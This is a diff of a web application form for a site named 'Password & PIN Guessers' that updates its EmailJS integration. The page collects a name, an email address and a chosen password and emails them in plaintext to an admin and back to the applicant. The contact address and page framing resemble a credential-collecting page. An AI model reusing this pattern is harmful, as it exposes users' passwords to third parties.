@@ -21,11 +21,10 @@
     .footer { text-align: center; padding: 2em 1em 1em; color: #999; font-size: 0.95em;}
     @media (max-width: 500px) { .login-container { padding: 1em; margin-top: 2em; } }
   </style>
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    window.onload = function() {
-      emailjs.init("hWBO8AkwBa8wkWNfu"); // Replace with your EmailJS public key
-    };
+  <!-- EmailJS v4 SDK -->
+  <script type="module">
+    import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js';
+    window.emailjs = emailjs;
   </script>
 </head>
 <body>
@@ -64,43 +63,53 @@
   <div class="footer">
     &copy; 2025 Password & PIN Guessers | Contact: <a href="mailto:maintinence2025@outlook.com">maintinence2025@outlook.com</a>
   </div>
-  <script>
-    document.getElementById('applyForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      document.getElementById('applyError').textContent = '';
-      document.getElementById('applySuccess').textContent = '';
-      // Get entered values
-      const name = document.getElementById('name').value.trim();
-      const email = document.getElementById('email').value.trim();
-      const newpass = document.getElementById('newpass').value;
-      const message = document.getElementById('message').value.trim();
+  <script type="module">
+    // WAIT FOR EmailJS SDK to load
+    window.addEventListener('DOMContentLoaded', function() {
+      emailjs.init("YOUR_PUBLIC_KEY"); // <-- Replace with your EmailJS public key
 
-      // Calculate username for auto-reply (first letter of first name + last name, all lower case)
-      const nameParts = name.split(' ');
-      const firstName = nameParts[0];
-      const lastName = nameParts.length > 1 ? nameParts.slice(1).join('') : '';
-      const username = (firstName[0] + lastName).toLowerCase();
+      document.getElementById('applyForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        document.getElementById('applyError').textContent = '';
+        document.getElementById('applySuccess').textContent = '';
 
-      // Send main application to admin
-      emailjs.send("service_o1rs29h", "template_h7uss93", {
-        name: name,
-        email: email,
-        newpass: newpass,
-        message: message,
-        time: new Date().toLocaleString()
-      })
-      .then(function(response) {
-        // Send auto-reply to applicant
-        emailjs.send("service_o1rs29h", "template_ybp3h4d", {
+        // Get entered values
+        const name = document.getElementById('name').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const newpass = document.getElementById('newpass').value;
+        const message = document.getElementById('message').value.trim();
+
+        // Calculate username for auto-reply (first letter of first name + last name, all lower case)
+        const nameParts = name.split(' ');
+        const firstName = nameParts[0];
+        const lastName = nameParts.length > 1 ? nameParts.slice(1).join('') : '';
+        const username = (firstName[0] + lastName).toLowerCase();
+
+        // Send main application to admin
+        emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
           name: name,
-          username: username,
+          email: email,
           newpass: newpass,
-          email: email
+          message: message,
+          time: new Date().toLocaleString()
+        })
+        .then(function(response) {
+          // Send auto-reply to applicant
+          emailjs.send("YOUR_SERVICE_ID", "YOUR_AUTO_REPLY_TEMPLATE_ID", {
+            name: name,
+            username: username,
+            newpass: newpass,
+            email: email
+          })
+          .then(function(response2) {
+            document.getElementById('applySuccess').textContent = 'Application sent! You will be contacted by email within three days.';
+            document.getElementById('applyForm').reset();
+          }, function(error2) {
+            document.getElementById('applyError').textContent = 'Application sent, but failed to send auto-reply email. Please contact maintinence2025@outlook.com for confirmation.';
+          });
+        }, function(error) {
+          document.getElementById('applyError').textContent = 'Failed to send application. Please try again.';
         });
-        document.getElementById('applySuccess').textContent = 'Application sent! You will be contacted by email within three days.';
-        document.getElementById('applyForm').reset();
-      }, function(error) {
-        document.getElementById('applyError').textContent = 'Failed to send application. Please try again.';
       });
     });
   </script>
